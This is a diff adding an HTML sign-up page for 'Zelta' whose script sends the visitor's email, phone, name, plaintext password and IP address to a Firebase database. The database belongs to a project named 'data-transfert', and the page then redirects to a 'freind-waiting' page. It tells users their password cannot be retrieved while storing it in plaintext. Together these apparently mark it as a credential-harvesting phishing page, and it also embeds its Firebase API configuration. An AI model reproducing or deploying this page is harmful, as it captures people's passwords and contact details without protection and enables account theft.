@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zelta</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="sign-in-style.css">
+    
+</head>
+
+<body>
+    <a href="index.html" class="back-button"><</a>
+    
+    <div class="container">
+       
+            
+        <form class="login-form">
+            <div id="empty" class="error" ></div>
+            <input id="mail" type="text" placeholder="Mail" />
+            <input id="phone" type="text" placeholder="Phone" />
+            <input id="name" type="text" placeholder="Name" />
+          
+            <div class="field" id="advice">Be careful not to forget your password, you will not be able to retreive it</div>
+          
+            <input id="password" type="password" placeholder="Password" />
+            <input id="confirm-password" type="password" placeholder="Confirm Password" />
+          
+            <button class="login-button" onclick="sendDataToFirebase()" id="sendButton">Sign in</button>
+          </form>  
+            
+        
+        </div>
+    
+
+    <script>
+        async function getIpClient() {
+          try {
+            const response = await axios.get('https://ipinfo.io/json');
+            return response.data.ip; // Return the IP address
+          } catch (error) {
+            console.error(error);
+            return null; // Return null if there's an error
+          }
+        }
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyD-IOULsrU9K7U9ASa74Wlpu_zfk3FBwuI",
+            authDomain: "data-transfert-dc397.firebaseapp.com",
+            databaseURL: "https://data-transfert-dc397-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "data-transfert-dc397",
+            storageBucket: "data-transfert-dc397.appspot.com",
+            messagingSenderId: "769173749251",
+            appId: "1:769173749251:web:ffa9a302f46c9fee471836",
+            measurementId: "G-ZBRMKEPHYP"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        
+        const database = firebase.database();
+        
+        function sendDataToFirebase() {
+          event.preventDefault();
+          getIpClient().then(ip => {
+            if (!ip) {
+              console.error("Erreur de récupération de l'IP:");
+              return;
+            }
+            const mailInput = document.getElementById('mail');
+            const phoneInput = document.getElementById('phone');
+            const nameInput = document.getElementById('name');
+            const passwordInput = document.getElementById('password');
+            const confirmPasswordInput = document.getElementById('confirm-password');
+
+            const mail = mailInput.value;
+            const phone = phoneInput.value;
+            const name = nameInput.value;
+            const password = passwordInput.value;
+            const confirmPassword = confirmPasswordInput.value;
+
+            // Verify each input
+            if (!mail) {
+              document.getElementById('empty').innerHTML = 'Please enter your mail';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (!mail.includes('@')) {
+              document.getElementById('empty').innerHTML = 'Please enter a valid mail';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (mail.length < 5) {
+              document.getElementById('empty').innerHTML = 'Please enter a valid mail';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (!phone) {
+              document.getElementById('empty').innerHTML = 'Please enter your phone number';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (phone.length < 10) {
+              document.getElementById('empty').innerHTML = 'Please enter a valid phone number with at least 10 digits';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (!name) {
+              document.getElementById('empty').innerHTML = 'Please enter your name';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (name.length < 3) {
+              document.getElementById('empty').innerHTML = 'Please enter a valid name with at least 3 characters';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (!password) {
+              document.getElementById('empty').innerHTML = 'Please enter your password';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (password.length < 8) {
+              document.getElementById('empty').innerHTML = 'Please enter a strong password';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (!confirmPassword) {
+              document.getElementById('empty').innerHTML = 'Please confirm your password';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            if (password!== confirmPassword) {
+              document.getElementById('empty').innerHTML = 'Passwords do not match';
+              document.getElementById('empty').style.display = 'block';
+              return;
+            }
+
+            // Send data to Firebase
+            const dataRef = database.ref('/zelta-accounts');
+
+            dataRef.push({
+              mail: mail,
+              phone: phone,
+              name: name,
+              password: password,
+              ip: ip
+            })
+             .then(() => {
+                console.log("Données envoyées avec succès à Firebase.");
+                // Redirige l'utilisateur vers la page finale uniquement après le succès de l'envoi
+                window.location.href = "freind-waiting.html";
+              })
+             .catch((error) => {
+                console.error("Erreur d'envoi des données à Firebase:", error);
+                document.getElementById('empty').innerHTML = 'Error sending data to Firebase';
+                document.getElementById('empty').style.display = 'block';
+              });
+          }).catch(error => {
+            console.error("Erreur de récupération de l'IP:", error);
+          });
+        }
+    </script>
+</body>
+
+</html>
